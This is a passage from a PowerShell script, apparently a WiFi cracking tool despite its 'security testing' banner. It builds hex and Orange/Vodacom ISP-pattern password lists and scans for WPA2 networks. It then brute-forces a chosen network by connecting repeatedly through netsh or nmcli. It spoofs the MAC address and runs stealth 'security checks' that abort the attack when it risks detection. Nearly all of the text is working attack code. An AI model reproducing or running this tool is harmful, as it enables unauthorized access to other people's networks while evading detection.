    
    foreach ($hex in $hexBatch) {
        if (-not $WrongPasswords -or -not $WrongPasswords.Contains($hex)) {
            [void]$passwords.Add($hex)
        }
    }
    
    # Add common hex patterns
    $hexPatterns = @(
        "000000000000000000", "111111111111111111", "888888888888888888",
        "123456789012345678", "876543210987654321",
        "ABCDEF123456789012", "0123456789ABCDEF01",
        "FEDCBA0987654321EF", "AABBCCDDEEFF001122",
        "001122334455667788", "112233445566778899"
    )
    
    foreach ($pattern in $hexPatterns) {
        if (-not $WrongPasswords -or -not $WrongPasswords.Contains($pattern)) {
            [void]$passwords.Add($pattern)
        }
    }
    
    # Add Orange/Vodacom specific patterns if enabled
    if ($script:CONFIG.PatternMode) {
        Write-Log "Generating Orange/Vodacom pattern passwords..." "INFO" $LogFile $DebugFile
        
        $ispPatterns = Generate-OrangeVodacomPatterns
        
        foreach ($pattern in $ispPatterns) {
            if ($pattern.Length -eq 18 -and (-not $WrongPasswords -or -not $WrongPasswords.Contains($pattern))) {
                [void]$passwords.Add($pattern)
            }
        }
        
        Write-Log "Added $($ispPatterns.Count) ISP-specific patterns" "INFO" $LogFile $DebugFile
    }
    
    # Load custom wordlists if exist
    $listsFolder = Join-Path $script:CONFIG.LogDirectory "lists"
    if (Test-Path $listsFolder) {
        Get-ChildItem -Path $listsFolder -Filter "*.txt" -ErrorAction SilentlyContinue | ForEach-Object {
            $words = Get-Content $_.FullName | ForEach-Object { $_.Trim() }
            foreach ($word in $words) {
                if ($word.Length -eq 18 -and (-not $WrongPasswords -or -not $WrongPasswords.Contains($word))) {
                    [void]$passwords.Add($word)
                }
            }
        }
    }
    
    # Remove duplicates
    $unique = [System.Collections.Generic.HashSet[string]]::new([StringComparer]::OrdinalIgnoreCase)
    $finalList = [System.Collections.Generic.List[string]]::new()
    
    foreach ($pass in $passwords) {
        if ($unique.Add($pass)) {
            [void]$finalList.Add($pass)
        }
    }
    
    Write-Log "Total unique passwords generated: $($finalList.Count)" "INFO" $LogFile $DebugFile
    
    return $finalList
}

<#
.SYNOPSIS
    Tests WiFi connection with given password (cross-platform)
#>
function Test-WifiConnection {
    param(
        [string]$SSID,
        [string]$Password,
        [string]$Security,
        [string]$Interface,
        [string]$LogFile,
        [string]$DebugFile
    )
    
    try {
        if ($script:CONFIG.IsWindows) {
            $profileName = "Temp_$(Get-Random)"
            $profileXml = @"
<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>$profileName</name>
    <SSIDConfig>
        <SSID>
            <name>$([Security.SecurityElement]::Escape($SSID))</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>manual</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>$([Security.SecurityElement]::Escape($Password))</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>
"@
            
            $tempFile = [System.IO.Path]::GetTempFileName()
            $profileXml | Out-File -FilePath $tempFile -Encoding UTF8
            
            netsh wlan add profile filename="$tempFile" interface="$Interface" | Out-Null
            netsh wlan connect name="$profileName" interface="$Interface" | Out-Null
            
            Start-Sleep -Milliseconds 2000
            
            $interfaceInfo = netsh wlan show interfaces interface="$Interface" | Out-String
            $connected = ($interfaceInfo -match "State\s+:\s+connected" -and $interfaceInfo -match "SSID\s+:\s+$([regex]::Escape($SSID))")
            
            netsh wlan delete profile name="$profileName" | Out-Null
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
            
            return $connected
            
        } else {
            $connectionName = "temp_$(Get-Random)"
            
            $result = sudo nmcli connection add type wifi con-name $connectionName ifname $Interface ssid $SSID wifi-sec.key-mgmt wpa-psk wifi-sec.psk $Password 2>&1
            sudo nmcli connection up $connectionName 2>&1 | Out-Null
            Start-Sleep -Milliseconds 2000
            
            $active = sudo nmcli connection show --active | Select-String $connectionName
            sudo nmcli connection delete $connectionName 2>&1 | Out-Null
            
            return ($active -ne $null)
        }
    }
    catch {
        Write-Log "Connection test error: $_" "ERROR" $LogFile $DebugFile
        return $false
    }
}

# ============================================
# MAIN FUNCTION
# ============================================

function Start-WifiCrack {
    try {
        # Initialization
        $defaultLogs = Get-LogPaths
        
        if (-not (Test-AdminRights)) {
            Write-Host "Administrator/root rights required!" -ForegroundColor Red
            return
        }
        
        $envInfo = Get-EnvironmentInfo
        Write-Log "Environment: $($envInfo.OS) | Admin: $($envInfo.IsAdmin)" "INFO" $defaultLogs.LogFile $defaultLogs.DebugFile
        
        # Security checks
        if (-not $SkipSecurityCheck) {
            Write-Host "`nPerforming security checks..." -ForegroundColor Yellow
            $securityMgr = [SecurityManager]::new($defaultLogs.LogFile, $defaultLogs.DebugFile, $script:CONFIG.StealthMode)
            $securityCheck = $securityMgr.CheckEnvironment()
            
            if ($securityCheck.CriticalIssues.Count -gt 0) {
                Write-Host "`nCRITICAL SECURITY ISSUES:" -ForegroundColor Red
                foreach ($issue in $securityCheck.CriticalIssues) {
                    Write-Host "  - $issue" -ForegroundColor Red
                }
                if ($script:CONFIG.StealthMode) {
                    Write-Host "`nOperation aborted." -ForegroundColor Red
                    return
                }
            }
            
            if ($securityCheck.Warnings.Count -gt 0) {
                Write-Host "`nWarnings:" -ForegroundColor Yellow
                foreach ($warning in $securityCheck.Warnings) {
                    Write-Host "  - $warning" -ForegroundColor Yellow
                }
                $continue = Read-Host "`nContinue? (Y/N)"
                if ($continue -ne "Y" -and $continue -ne "y") { return }
            }
        }
        
        Clear-Host
        Write-Host "WiFi Security Testing Tool v5.0" -ForegroundColor Cyan
        Write-Host "OS: $($envInfo.OS) | Mode: $Mode | Pattern Mode: $($script:CONFIG.PatternMode)" -ForegroundColor Gray
        Write-Host "===================================================" -ForegroundColor Cyan
        
        # Select adapter
        $adapter = Select-NetworkAdapter
        if (-not $adapter) { return }
        
        $script:CONFIG.Interface = $adapter.Name
        $script:CONFIG.InterfaceGUID = if ($adapter.GUID) { $adapter.GUID } else { $adapter.Name }
        
        Write-Host "`nSelected: $($adapter.Name)" -ForegroundColor Green
        
        # MAC Spoofing
        Save-OriginalMac -Interface $adapter.Name
        
        if (-not $DisableMacSpoof) {
            Write-Host "`nChanging MAC address..." -ForegroundColor Yellow
            if (-not (Set-MacAddress -Interface $adapter.Name)) {
                $cont = Read-Host "Continue with original MAC? (Y/N)"
                if ($cont -ne "Y" -and $cont -ne "y") { return }
            }
        }
        
        # Scan networks
        Write-Host "`nScanning for networks..." -ForegroundColor Yellow
        $networks = Get-WifiNetworks -LogFile $defaultLogs.LogFile -DebugFile $defaultLogs.DebugFile
        
        if (-not $networks -or $networks.Count -eq 0) {
            Write-Host "No networks found!" -ForegroundColor Red
            return
        }
        
        Write-Host "`nAvailable Networks:" -ForegroundColor Cyan
        for ($i = 0; $i -lt $networks.Count; $i++) {
            Write-Host "[$i] $($networks[$i].SSID) (Signal: $($networks[$i].Signal)%, Security: $($networks[$i].Security))" -ForegroundColor Green
        }
        
        # Select network
        do {
            $sel = Read-Host "`nSelect network (0-$($networks.Count - 1))"
        } while ($sel -notmatch '^\d+$' -or [int]$sel -lt 0 -or [int]$sel -ge $networks.Count)
        
        $target = $networks[[int]$sel]
        Write-Host "`nTarget: $($target.SSID)" -ForegroundColor Cyan
        
        # Initialize
        $paths = Get-LogPaths -SSID $target.SSID
        
        # Generate passwords
        Write-Host "`nGenerating password list..." -ForegroundColor Yellow
        $wrongPasswords = [System.Collections.Generic.HashSet[string]]::new([StringComparer]::OrdinalIgnoreCase)
        
        if (Test-Path $paths.WrongPasswordsFile) {
            Get-Content $paths.WrongPasswordsFile | ForEach-Object { [void]$wrongPasswords.Add($_) }
        }
        
        $passwordList = Generate-PasswordList -SSID $target.SSID -LogFile $paths.LogFile -DebugFile $paths.DebugFile -WrongPasswords $wrongPasswords -HexCount $HexPasswordCount
        
        if ($passwordList.Count -eq 0) {
            Write-Host "No passwords generated!" -ForegroundColor Red
            return
        }
        
        Write-Host "Total passwords to test: $($passwordList.Count)" -ForegroundColor Cyan
        if ($script:CONFIG.PatternMode) {
            Write-Host "Pattern mode enabled: Orange/Vodacom specific patterns included" -ForegroundColor Magenta
        }
        Write-Host "Press 'Q' to stop`n" -ForegroundColor Yellow
        
        # Test
        $connectionMgr = [ConnectionStateManager]::new($script:CONFIG.Interface, $script:CONFIG.InterfaceGUID, $paths.LogFile, $paths.DebugFile)
        $progress = [ProgressTracker]::new($passwordList.Count, $paths.LogFile, $paths.DebugFile)
        $connectionMgr.StartTimer()
        
        $hexTested = 0
        $patternTested = 0
        
        foreach ($password in $passwordList) {
            if ([Console]::KeyAvailable) {
                $key = [Console]::ReadKey($true)
                if ($key.Key -eq 'Q') { break }
            }
            
            $progress.UpdateProgress($password)
            
            # Counter
            if ($password -match '^[0-9A-F]{18}$') { 
                $hexTested++ 
            } else { 
                $patternTested++ 
            }
            
            # Periodic security check
            $timeSinceLastCheck = (Get-Date) - $script:CONFIG.LastSecurityCheck
            if ($timeSinceLastCheck.TotalSeconds -gt $script:CONFIG.SecurityCheckInterval) {
                if (-not $SkipSecurityCheck) {
                    $quickCheck = [SecurityManager]::new($paths.LogFile, $paths.DebugFile, $script:CONFIG.StealthMode)
                    $check = $quickCheck.CheckEnvironment()
                    if ($check.CriticalIssues.Count -gt 0) {
                        Write-Host "`nSECURITY ALERT!" -ForegroundColor Red
                        break
                    }
                }
                $script:CONFIG.LastSecurityCheck = Get-Date
            }
            
            # Test connection
            $success = Test-WifiConnection -SSID $target.SSID -Password $password -Security $target.Security -Interface $script:CONFIG.Interface -LogFile $paths.LogFile -DebugFile $paths.DebugFile
            
            if ($success) {
                $elapsed = $connectionMgr.GetElapsedTime()
                $stats = $progress.GetStatistics()
                
                Write-Host "`n`nPASSWORD FOUND!" -ForegroundColor Green
                Write-Host "SSID: $($target.SSID)" -ForegroundColor Green
                Write-Host "Password: $password" -ForegroundColor Green
                Write-Host "Time: $($elapsed.ToString('mm\:ss'))" -ForegroundColor Green
                
                if ($password -match '^[0-9A-F]{18}$') {
                    Write-Host "Type: 18-char HEXADECIMAL" -ForegroundColor Magenta
                } else {
                    Write-Host "Type: ISP Pattern (Orange/Vodacom)" -ForegroundColor Cyan
                }
                
                Write-Log "SUCCESS: Password found" "SUCCESS" $paths.LogFile $paths.DebugFile
                
                $result = @"
SSID: $($target.SSID)
Password: $password
Time: $($elapsed.ToString('mm\:ss'))
Tested: $($stats.TestedPasswords)
Date: $(Get-Date)
"@
                $result | Out-File -FilePath $paths.SuccessFile -Encoding UTF8
                
                # Restore MAC
                if (-not $DisableMacSpoof) {
                    Set-MacAddress -Interface $script:CONFIG.Interface -RestoreOriginal
                }
                
                return
            }
            
            Add-Content -Path $paths.WrongPasswordsFile -Value $password
        }
        
        # End
        $progress.Complete()
        $elapsed = $connectionMgr.GetElapsedTime()
        
        Write-Host "`nPassword not found." -ForegroundColor Red
        Write-Host "Time: $($elapsed.ToString('mm\:ss'))" -ForegroundColor Yellow
        Write-Host "Tested: Hex=$hexTested, Patterns=$patternTested" -ForegroundColor Gray
        
        # Restore MAC
        if (-not $DisableMacSpoof) {
            Write-Host "`nRestoring original MAC..." -ForegroundColor Yellow
            Set-MacAddress -Interface $script:CONFIG.Interface -RestoreOriginal
        }
        
    }
    catch {
        Write-Host "`nCritical error: $_" -ForegroundColor Red
        Write-Log "Critical error: $_" "ERROR"
        
        if (-not $DisableMacSpoof -and $script:CONFIG.Interface) {
            Set-MacAddress -Interface $script:CONFIG.Interface -RestoreOriginal
        }
    }
    finally {
        # Ensure MAC is restored on abrupt exit
        if (-not $DisableMacSpoof -and $script:CONFIG.Interface -and $script:CONFIG.SpoofedMac) {
            Write-Host "`nExit detected. Restoring original MAC..." -ForegroundColor Yellow
            Set-MacAddress -Interface $script:CONFIG.Interface -RestoreOriginal
        }
        
        Write-Host "`nPress any key to exit..." -ForegroundColor Cyan
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    }
}

# ============================================
# ENTRY POINT
# ============================================

try {
    $proc = Get-Process -Id $PID
    $proc.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::High
}
catch { }

Start-WifiCrack